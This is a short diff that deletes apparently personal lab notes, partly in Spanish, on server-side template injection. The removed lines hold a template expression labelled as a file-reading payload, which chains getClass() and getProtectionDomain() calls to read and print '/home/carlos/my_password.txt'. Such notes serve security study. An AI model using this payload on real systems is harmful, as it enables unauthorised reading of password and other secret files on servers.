@@ -1,6 +1,0 @@
-
-${object.getClass()} -> Deberia estar disponible en todos los objetos la funcion getClass()
-
------------------- payload for --> file reading
-
-${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
